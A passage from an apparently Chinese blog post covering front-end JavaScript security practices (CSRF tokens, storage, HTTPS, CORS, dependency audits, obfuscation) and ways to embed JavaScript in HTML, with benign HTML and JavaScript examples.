class="hljs-string">&quot;user data&quot;</span> &#125;)<br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>双重 Cookie 防护</strong>：</p>
<ul>
<li>一种常见的策略是使用双重 Cookie：一个是标准的会话 Cookie，另一个是 HTTP 头中发送的 CSRF 令牌。这种方式可以确保请求必须来自合法的用户端。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="四、前端存储的安全性"><a href="#四、前端存储的安全性" class="headerlink" title="四、前端存储的安全性"></a>四、前端存储的安全性</h3><p>Web 应用中前端存储的数据（如 <code>LocalStorage</code> 和 <code>SessionStorage</code>）也存在安全隐患，尤其是处理敏感数据时，需要特别小心。因为前端存储的数据是可以被浏览器中的任何脚本读取的。</p>
<h4 id="4-1-避免存储敏感数据"><a href="#4-1-避免存储敏感数据" class="headerlink" title="4.1 避免存储敏感数据"></a>4.1 避免存储敏感数据</h4><ol>
<li><p><strong>敏感数据不应存储在 LocalStorage 或 SessionStorage</strong>：</p>
<ul>
<li>不要将敏感信息（如用户的登录凭证、密码、令牌等）直接存储在 <code>LocalStorage</code> 或 <code>SessionStorage</code> 中，因为它们对 JavaScript 代码完全公开，任何脚本（包括 XSS）都可以访问这些存储数据。</li>
<li>如果需要使用会话令牌，应该存储在 Cookie 中，并使用 <code>HttpOnly</code> 和 <code>Secure</code> 标志，确保 JavaScript 无法访问，且只在 HTTPS 连接中传输。</li>
</ul>
</li>
<li><p><strong>加密存储</strong>：</p>
<ul>
<li>对存储的数据进行加密，即使攻击者能够读取存储的内容，也无法轻易解密这些信息。</li>
<li>但应注意，前端的加密密钥也不能存储在客户端代码中，因为这样会暴露给潜在的攻击者。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="五、网络请求的安全性"><a href="#五、网络请求的安全性" class="headerlink" title="五、网络请求的安全性"></a>五、网络请求的安全性</h3><p>JavaScript 通常用于发起网络请求（如 AJAX、Fetch API 等），因此请求的安全性也是审计的重点。确保数据传输的安全，防止网络层面上的攻击。</p>
<h4 id="5-1-HTTPS-加密通信"><a href="#5-1-HTTPS-加密通信" class="headerlink" title="5.1 HTTPS 加密通信"></a>5.1 HTTPS 加密通信</h4><ol>
<li><p><strong>确保所有请求都通过 HTTPS 进行传输</strong>：</p>
<ul>
<li>通过 HTTPS 可以确保数据在客户端和服务器之间的传输是加密的，防止中间人攻击（MITM）。</li>
<li>在 JavaScript 中，确保请求的 URL 都是 HTTPS 地址，而不是 HTTP。</li>
</ul>
</li>
<li><p>**验证服务器</p>
</li>
</ol>
<p>的 SSL 证书**：</p>
<ul>
<li>如果网站没有正确配置 SSL 证书，浏览器会提醒用户连接不安全，导致信任问题。应确保服务器配置了有效的 SSL 证书，且不会过期。</li>
</ul>
<h4 id="5-2-防止-API-滥用和-CSRF"><a href="#5-2-防止-API-滥用和-CSRF" class="headerlink" title="5.2 防止 API 滥用和 CSRF"></a>5.2 防止 API 滥用和 CSRF</h4><ol>
<li><p><strong>使用适当的身份验证和授权机制</strong>：</p>
<ul>
<li>通过令牌（如 JWT 或 OAuth）进行身份验证，并确保每个请求都带有合法的身份验证令牌。</li>
</ul>
</li>
<li><p><strong>限制请求来源</strong>：</p>
<ul>
<li>使用 CORS（跨域资源共享）头，指定哪些域名可以合法访问 API。确保服务器只接受来自可信域的请求，防止恶意网站滥用 API。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://trusted-domain.com;<br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="六、依赖和第三方库的安全性"><a href="#六、依赖和第三方库的安全性" class="headerlink" title="六、依赖和第三方库的安全性"></a>六、依赖和第三方库的安全性</h3><p>JavaScript 项目中使用第三方库时，必须确保这些库是安全的，因为它们可能包含漏洞或恶意代码。</p>
<h4 id="6-1-审查和更新依赖库"><a href="#6-1-审查和更新依赖库" class="headerlink" title="6.1 审查和更新依赖库"></a>6.1 审查和更新依赖库</h4><ol>
<li><p><strong>定期更新第三方库</strong>：</p>
<ul>
<li>使用 <code>npm audit</code> 或类似工具，定期检查项目中是否存在安全漏洞。更新到最新的稳定版本，以修补已知的安全问题。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm audit fix<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>使用受信任的库源</strong>：</p>
<ul>
<li>只从可信赖的源下载和安装库。避免使用来源不明的库，防止供应链攻击（供应链攻击是指攻击者通过修改合法软件包的代码来传播恶意软件）。</li>
</ul>
</li>
<li><p><strong>移除未使用的依赖</strong>：</p>
<ul>
<li>不使用的库和代码可能成为潜在的安全隐患。定期清理项目，确保只保留必要的依赖项。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="七、前端代码的混淆与保护"><a href="#七、前端代码的混淆与保护" class="headerlink" title="七、前端代码的混淆与保护"></a>七、前端代码的混淆与保护</h3><p>前端代码是完全公开的，任何用户都可以查看源码。因此，在某些敏感应用场景下，应考虑对前端 JavaScript 代码进行混淆，增加反向工程的难度。</p>
<h4 id="7-1-代码混淆和压缩"><a href="#7-1-代码混淆和压缩" class="headerlink" title="7.1 代码混淆和压缩"></a>7.1 代码混淆和压缩</h4><ol>
<li><p><strong>使用工具混淆代码</strong>：</p>
<ul>
<li>使用工具如 UglifyJS 或 Terser 来压缩和混淆 JavaScript 代码，使其难以被理解。这可以防止一些低水平的攻击者直接查看代码逻辑。</li>
</ul>
</li>
<li><p><strong>谨慎使用敏感数据</strong>：</p>
<ul>
<li>即便进行了混淆，敏感逻辑或数据仍然不应该放置在前端代码中。应确保所有敏感逻辑尽可能放置在后端服务器上执行。</li>
</ul>
</li>
</ol>
<hr>
<p>将 JavaScript 嵌入 HTML 有多种方式，每种方式都适用于不同的场景，具体的选择取决于代码的大小、复用需求以及性能优化的考虑。以下是将 JavaScript 嵌入 HTML 的几种主要方式，以及它们的用法和适用场景。</p>
<h3 id="1-内联-JavaScript"><a href="#1-内联-JavaScript" class="headerlink" title="1. 内联 JavaScript"></a>1. <strong>内联 JavaScript</strong></h3><p>内联 JavaScript 是将 JavaScript 代码直接嵌入到 HTML 标签的 <code>script</code> 元素中。这种方法简单直观，适用于少量的脚本代码。</p>
<h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Inline JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, World!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">// 这是内联 JavaScript 代码</span></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This is an inline JavaScript script.&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="适用场景："><a href="#适用场景：" class="headerlink" title="适用场景："></a>适用场景：</h4><ul>
<li>当 JavaScript 代码量较少时，例如一个简单的交互。</li>
<li>临时或快速测试小功能的场景。</li>
</ul>
<h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><ul>
<li><strong>可维护性差</strong>：如果代码量较大，内联代码会使 HTML 文件难以维护和阅读。</li>
<li><strong>安全性问题</strong>：由于代码直接嵌入到 HTML 中，容易受到跨站脚本攻击（XSS）。应该谨慎使用，避免直接插入用户输入数据。</li>
</ul>
<hr>
<h3 id="2-外部-JavaScript-文件"><a href="#2-外部-JavaScript-文件" class="headerlink" title="2. 外部 JavaScript 文件"></a>2. <strong>外部 JavaScript 文件</strong></h3><p>外部 JavaScript 是将 JavaScript 代码放在单独的文件中，并通过 <code>&lt;script&gt;</code> 标签引入。这种方式有利于代码的复用、管理和维护。</p>
<h4 id="用法：-1"><a href="#用法：-1" class="headerlink" title="用法："></a>用法：</h4><p>首先，创建一个外部 JavaScript 文件，如 <code>script.js</code>，并编写代码：</p>
<p><strong><code>script.js</code> 文件：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 这是一个外部 JavaScript 文件</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This script is from an external JavaScript file.&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>然后，在 HTML 中引入该外部文件：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>External JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入外部 JavaScript 文件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, External Script!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="适用场景：-1"><a href="#适用场景：-1" class="headerlink" title="适用场景："></a>适用场景：</h4><ul>
<li>当 JavaScript 代码量较大时，或需要多个页面共享相同的 JavaScript 代码时。</li>
<li>外部文件更易于版本控制、团队协作和性能优化（例如浏览器缓存 JavaScript 文件）。</li>
</ul>
<h4 id="注意事项：-1"><a href="#注意事项：-1" class="headerlink" title="注意事项："></a>注意事项：</h4><ul>
<li><strong>文件加载顺序</strong>：外部脚本在默认情况下是同步加载的，这意味着 HTML 的解析会等待 JavaScript 文件的加载和执行完成。在大文件或网络较慢时，这会影响页面加载速度。可以通过 <code>async</code> 或 <code>defer</code> 属性来优化加载。</li>
</ul>
<hr>
<h3 id="3-异步与延迟加载-JavaScript（async-和-defer）"><a href="#3-异步与延迟加载-JavaScript（async-和-defer）" class="headerlink" title="3. 异步与延迟加载 JavaScript（async 和 defer）"></a>3. <strong>异步与延迟加载 JavaScript（async 和 defer）</strong></h3><p>为了优化页面加载性能，外部 JavaScript 文件可以使用 <code>async</code> 或 <code>defer</code> 属性，这两个属性控制脚本的加载和执行时机。</p>
<h4 id="3-1-async-属性"><a href="#3-1-async-属性" class="headerlink" title="3.1 async 属性"></a>3.1 <code>async</code> 属性</h4><p><code>async</code> 会让脚本文件异步加载，加载完成后立即执行。这意味着脚本的执行顺序可能与 HTML 的加载顺序不一致。</p>
<h4 id="用法：-2"><a href="#用法：-2" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><ul>
<li>脚本与 HTML 并行加载，且脚本在加载完后立即执行。</li>
<li>适用于不会依赖 DOM 的独立脚本，比如分析工具、广告代码等。</li>
</ul>
<h4 id="3-2-defer-属性"><a href="#3-2-defer-属性" class="headerlink" title="3.2 defer 属性"></a>3.2 <code>defer</code> 属性</h4><p><code>defer</code> 属性也让脚本文件异步加载，但它保证脚本在 HTML 文档完全解析后才会执行，且按顺序执行。</p>
<h4 id="用法：-3"><a href="#用法：-3" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h4><ul>
<li><code>defer</code> 保证脚本按顺序执行，且不会阻塞 HTML 的解析。</li>
<li>适用于依赖 DOM 的 JavaScript 文件。</li>
</ul>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Defer and Async Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script1.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script2.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Async vs Defer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-事件属性中的-JavaScript"><a href="#4-事件属性中的-JavaScript" class="headerlink" title="4. 事件属性中的 JavaScript"></a>4. <strong>事件属性中的 JavaScript</strong></h3><p>JavaScript 代码还可以直接嵌入到 HTML 元素的事件属性中（如 <code>onclick</code>、<code>onchange</code> 等）。这种方式直接将 JavaScript 写入元素的属性值中，常用于处理简单的事件响应。</p>
<h4 id="用法：-4"><a href="#用法：-4" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Event Attribute Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Button clicked!&#x27;)&quot;</span>&gt;</span>Click Me!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="适用场景：-2"><a href="#适用场景：-2" class="headerlink" title="适用场景："></a>适用场景：</h4><ul>
<li>适用于简单的事件处理，比如按钮点击时弹出提示框。</li>
<li>快速实现小的交互功能。</li>
</ul>
<h4 id="注意事项：-2"><a href="#注意事项：-2" class="headerlink" title="注意事项："></a>注意事项：</h4><ul>
<li><strong>可维护性差</strong>：将 JavaScript 直接写在 HTML 中会使得代码难以维护，尤其是在复杂应用中，事件处理应通过外部脚本或事件监听器完成。</li>
<li><strong>安全性问题</strong>：与内联 JavaScript 类似，容易导致 XSS 攻击。</li>
</ul>
<hr>
<h3 id="5-模块化-JavaScript"><a href="#5-模块化-JavaScript" class="headerlink" title="5. 模块化 JavaScript (&lt;script type=&quot;module&quot;&gt;)"></a>5. <strong>模块化 JavaScript (<code>&lt;script type=&quot;module&quot;&gt;</code>)</strong></h3><p>ES6 引入了模块系统，可以通过 <code>&lt;script type=&quot;module&quot;&gt;</code> 来加载 JavaScript 模块文件。这种方式让开发者能够使用模块化的代码组织方式，从而更好地管理大型项目的依赖。</p>
<h4 id="用法：-5"><a href="#用法：-5" class="headerlink" title="用法："></a>用法：</h4><p>首先，创建一个模块文件 <code>module.js</code>：</p>
<p><strong><code>module.js</code> 文件：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from the module!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后，在 HTML 中引入模块并使用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JavaScript Modules Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">import</span> &#123; greet &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-title function_">greet</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>JavaScript Modules<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="适用场景：-3"><a href="#适用场景：-3" class="headerlink" title="适用场景："></a>适用场景：</h4><ul>
<li>适合大型应用程序，能够以模块化的方式组织代码。</li>
<li>允许使用 ES6 的 <code>import</code> 和 <code>export</code>，便于依赖管理。</li>
</ul>
<h4 id="注意事项：-3"><a href="#注意事项：-3" class="headerlink" title="注意事项："></a>注意事项：</h4><ul>
<li><strong>浏览器支持</strong>：现代浏览器都支持 <code>&lt;script type=&quot;module&quot;&gt;</code>，但在旧浏览器中可能不兼容。</li>
<li><strong>严格模式</strong>：模块文件中默认使用严格模式（<code>strict mode</code>），这会带来更严格的语法检查。</li>
</ul>
<hr>
<h3 id="6-动态加载-JavaScript"><a href="#6-动态加载-JavaScript" class="headerlink" title="6. 动态加载 JavaScript"></a>6. <strong>动态加载 JavaScript</strong></h3><p>有时，JavaScript 文件需要在特定条件下或事件发生后再动态加载。这种方式通常用于提高性能或在特定功能需求时加载额外的脚本。</p>
<h4 id="用法：-6"><a href="#用法：-6" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dynamic Script Loading Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loadScriptButton&quot;</span>&gt;</span>Load Script<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadScriptButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">            script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;dynamic-script.js&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="适用场景：-4"><a href="#适用场景：-4" class="headerlink" title="适用场景："></a>适用场景：</h4><ul>
<li>动态加载资源以减少初始页面加载时间。</li>
<li>按需加载脚本，例如用户点击按钮后才加载脚本。</li>
</ul>
<h4 id="注意事项：-4"><a href="#注意事项：-4" class="headerlink" title="注意事项："></a>注意事项：</h4><ul>
<li>动态加载的脚本是异步的，因此要确保依赖关系不会被破坏。如果需要按顺序加载多个动态脚本，可以通过回调或 <code>Promise</code> 来控制。</li>
</ul>
<hr>
<p>好的！接下来我将详细展开 <strong>Flask 框架架构与基础概念、常见的安全漏洞、攻击利用方法、安全防御措施、漏洞总结等</strong>，包括详细的代码示例和解释。</p>
<hr>
